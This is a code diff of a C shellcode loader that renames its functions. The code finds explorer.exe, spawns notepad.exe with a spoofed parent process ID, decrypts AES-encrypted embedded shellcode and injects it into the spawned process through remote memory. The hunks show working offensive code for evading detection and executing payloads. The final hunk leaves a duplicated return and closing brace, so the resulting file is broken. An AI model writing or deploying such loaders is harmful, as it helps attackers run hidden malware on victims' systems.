@@ -184,7 +184,7 @@ unsigned char AesIv[] = {
         0x04, 0xB2, 0x13, 0x5E, 0x24, 0x0E, 0x0D, 0x8B, 0x97, 0x0E, 0x45, 0x7E, 0x27, 0x65, 0x6E, 0xB4 };
 
 
-BOOL injection(HANDLE hProcess, PBYTE shellcode, SIZE_T shellcodeSize) {
+BOOL InjectShellcodeRemoteProcess(HANDLE hProcess, PBYTE shellcode, SIZE_T shellcodeSize) {
     PVOID remoteMemory;
     DWORD oldProtect;
 
@@ -218,7 +218,7 @@ BOOL injection(HANDLE hProcess, PBYTE shellcode, SIZE_T shellcodeSize) {
     CloseHandle(hThread);
     return TRUE;
 }
-BOOL search_process(LPCWSTR  procees_name, HANDLE* hprocess_out, DWORD* process_id_out) {
+BOOL FindProcessHandleByName(LPCWSTR  procees_name, HANDLE* hprocess_out, DWORD* process_id_out) {
 
     PROCESSENTRY32 pe;
     pe.dwSize = sizeof(pe);
@@ -264,7 +264,7 @@ BOOL search_process(LPCWSTR  procees_name, HANDLE* hprocess_out, DWORD* process_
 
 
 
-BOOL ppid(HANDLE hparentprocess, LPCSTR process_name, HANDLE* hthread, HANDLE* hprocess, DWORD* pid) {
+BOOL CreateProcessWithSpoofedPPID(HANDLE hparentprocess, LPCSTR process_name, HANDLE* hthread, HANDLE* hprocess, DWORD* pid) {
     STARTUPINFOEXA si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -330,7 +330,7 @@ BOOL ppid(HANDLE hparentprocess, LPCSTR process_name, HANDLE* hthread, HANDLE* h
 }
 
 
- 
+
 int main() {
     LPCWSTR parentprocess = L"explorer.exe";
     LPCSTR process_name = "notepad.exe";
@@ -341,9 +341,9 @@ int main() {
     HANDLE hparentprocess = NULL;
     PVOID DecryptedShellcode = NULL;
     DWORD DecryptedShellcodeSize = 0;
-    if (search_process(parentprocess, &hparentprocess, &dwppdi))
+    if (FindProcessHandleByName(parentprocess, &hparentprocess, &dwppdi))
     {
-        if (ppid(hparentprocess, process_name, &hthread, &hprocess, &pid))
+        if (CreateProcessWithSpoofedPPID(hparentprocess, process_name, &hthread, &hprocess, &pid))
         {
             if (SimpleDecryption(
                 AesCipherText,
@@ -353,10 +353,12 @@ int main() {
                 &DecryptedShellcode,
                 &DecryptedShellcodeSize))
             {
-                injection(hprocess, (PBYTE)DecryptedShellcode, DecryptedShellcodeSize);
+                InjectShellcodeRemoteProcess(hprocess, (PBYTE)DecryptedShellcode, DecryptedShellcodeSize);
             }
         }
     }
 
+    return 0;
+}
     return 0;
 }
